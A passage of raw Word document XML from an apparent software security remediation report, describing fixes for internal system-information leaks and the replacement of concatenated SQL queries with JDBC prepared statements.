            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>figure 30</w:delText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="005432B6">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">, </w:delText>
        </w:r>
        <w:r>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00AA6B09">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delInstrText>HYPERLINK \l "fig_SystemInformationLeakInternal3" \h</w:delInstrText>
        </w:r>
        <w:r>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="005432B6">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>figure 31</w:delText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="005432B6">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> and </w:delText>
        </w:r>
        <w:r>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00AA6B09">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delInstrText>HYPERLINK \l "fig_SystemInformationLeakInternal4" \h</w:delInstrText>
        </w:r>
        <w:r>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="005432B6">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>figure 32</w:delText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:del>
      <w:ins w:id="156" w:author="Microsoft Word" w:date="2025-06-03T16:29:00Z">
        <w:r w:rsidRPr="005432B6">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>(</w:t>
        </w:r>
        <w:r w:rsidR="00795FAB">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00795FAB">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> REF _Ref199860535 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00795FAB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:ins w:id="157" w:author="Microsoft Word" w:date="2025-06-03T16:29:00Z">
        <w:r w:rsidR="00795FAB">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:ins w:id="158" w:author="Microsoft Word" w:date="2025-06-03T16:29:00Z">
        <w:r w:rsidR="00795FAB">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>), any printout that may reveal important or risky security information must be changed. In some cases, the error message was changed completely (</w:t>
      </w:r>
      <w:hyperlink w:anchor="fig_MitigateSystemInformationLeakInternal1">
        <w:r w:rsidRPr="005432B6">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>figure 33</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink w:anchor="fig_MitigateSystemInformationLeakInternal2">
        <w:r w:rsidRPr="005432B6">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>figure 34</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:hyperlink w:anchor="fig_MitigateSystemInformationLeakInternal3">
        <w:r w:rsidRPr="005432B6">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>figure 35</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>); in others, the risky feature was removed (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00EA135B">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00EA135B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199867292 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00EA135B">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Errore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>L'origine</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>riferimento</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> non è </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>stata</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>trovata</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00EA135B">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
      <w:ins w:id="159" w:author="Microsoft Word" w:date="2025-06-03T16:29:00Z">
        <w:r w:rsidRPr="005432B6">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>In some cases, the error message was changed completely; in others, the risky feature was removed (</w:t>
        </w:r>
        <w:r w:rsidR="00795FAB">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00795FAB">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> REF _Ref199860578 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00795FAB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:ins w:id="160" w:author="Microsoft Word" w:date="2025-06-03T16:29:00Z">
        <w:r w:rsidR="00795FAB">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:ins w:id="161" w:author="Microsoft Word" w:date="2025-06-03T16:29:00Z">
        <w:r w:rsidR="00795FAB">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00795FAB">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "fig_MitigateSystemInformationLeakInternal4" \h</w:instrText>
        </w:r>
        <w:r w:rsidR="004E7FC7">
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="005432B6">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>).</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1222254E" w14:textId="403710B8" w:rsidR="00A3267A" w:rsidRPr="005432B6" w:rsidRDefault="00A3267A" w:rsidP="00A3267A">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="0EB8DA02" wp14:editId="64903366">
            <wp:extent cx="2806538" cy="509251"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1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64"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2806538" cy="509251"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="42FDE8E5" w14:textId="2EA30D04" w:rsidR="00A3267A" w:rsidRPr="005432B6" w:rsidRDefault="00A3267A" w:rsidP="00A3267A">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="0B10C47F" wp14:editId="1D4EF9F4">
            <wp:extent cx="3101813" cy="579961"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="2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5"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3101813" cy="579961"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="21DC5E94" w14:textId="0C8F0DA4" w:rsidR="00A3267A" w:rsidRPr="005432B6" w:rsidRDefault="00A3267A" w:rsidP="00A3267A">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="79D7D9DB" wp14:editId="68CDAD0D">
            <wp:extent cx="4040025" cy="680802"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="33"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66"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4040025" cy="680802"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="79DD0F5F" w14:textId="77777777" w:rsidR="00A3267A" w:rsidRDefault="00A3267A" w:rsidP="00A3267A">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="3574CDB9" wp14:editId="5D0511AA">
            <wp:extent cx="4420444" cy="904769"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1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67"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4420444" cy="904769"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="30A3A5FA" w14:textId="0EC3B6E3" w:rsidR="00A3267A" w:rsidRDefault="00A3267A" w:rsidP="00A3267A">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="162" w:name="_Ref199860535"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00795FAB">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00795FAB">
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00795FAB">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>46</w:t>
      </w:r>
      <w:r w:rsidR="00795FAB">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="162"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="003203BE">
        <w:t>System Information Leak: Internal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E250EE3" w14:textId="6E48CC93" w:rsidR="00A3267A" w:rsidRPr="005432B6" w:rsidRDefault="00A3267A" w:rsidP="00A3267A">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="70AC03FE" w14:textId="77777777" w:rsidR="00A3267A" w:rsidRPr="005432B6" w:rsidRDefault="00A3267A">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="454A3E4E" w14:textId="0A92C859" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="5A0FD5E5" wp14:editId="07777777">
            <wp:extent cx="3111338" cy="697369"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="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8"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3111338" cy="697369"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="05D29E60" w14:textId="366D8663" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="6A6106EE" wp14:editId="07777777">
            <wp:extent cx="2916075" cy="707634"/>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9"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2916075" cy="707634"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="60CA7AF8" w14:textId="1F3ADAE0" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="56CB4256" wp14:editId="07777777">
            <wp:extent cx="4100513" cy="810566"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="12"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70"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4100513" cy="810566"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AD85601" w14:textId="77777777" w:rsidR="00795FAB" w:rsidRDefault="001A39A9" w:rsidP="00795FAB">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="54BB2532" wp14:editId="07777777">
            <wp:extent cx="3851654" cy="812558"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1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71"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3851654" cy="812558"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F6FEBB0" w14:textId="52C09090" w:rsidR="00D464C1" w:rsidRDefault="00795FAB" w:rsidP="00795FAB">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="163" w:name="_Ref199860578"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>47</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="163"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="003C6D62">
        <w:t>Mitigate System Information Leak: Internal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08224896" w14:textId="77777777" w:rsidR="000A5824" w:rsidRDefault="000A5824" w:rsidP="000A5824">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="264754EC" w14:textId="77777777" w:rsidR="000A5824" w:rsidRDefault="000A5824" w:rsidP="000A5824">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="164" w:name="_Toc200039325"/>
      <w:r>
        <w:t>SQL-injection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="164"/>
    </w:p>
    <w:p w14:paraId="2823D0D5" w14:textId="1EDC6476" w:rsidR="00186DB0" w:rsidRPr="00186DB0" w:rsidRDefault="00186DB0" w:rsidP="00186DB0">
      <w:pPr>
        <w:pStyle w:val="NormaleWeb"/>
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00186DB0">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Data entry into the database was achieved by dynamically constructing an SQL query by directly concatenating values entered by the user</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref200039785 \h </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00186DB0">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>. This makes the database vulnerable to SQL injection, as a malicious user could enter malicious SQL commands in the input fields.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="419BD5AB" w14:textId="0806B7EC" w:rsidR="00186DB0" w:rsidRPr="00186DB0" w:rsidRDefault="00186DB0" w:rsidP="00186DB0">
      <w:pPr>
        <w:pStyle w:val="NormaleWeb"/>
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00186DB0">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">To address this issue, the code was modified to use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00186DB0">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>PreparedStatements</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00186DB0">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> from JDBC</w:t>
      </w:r>
      <w:r w:rsidR="008231A3">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidR="008231A3">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="008231A3">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref200039831 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="008231A3">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="008231A3">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="008231A3">
        <w:rPr>
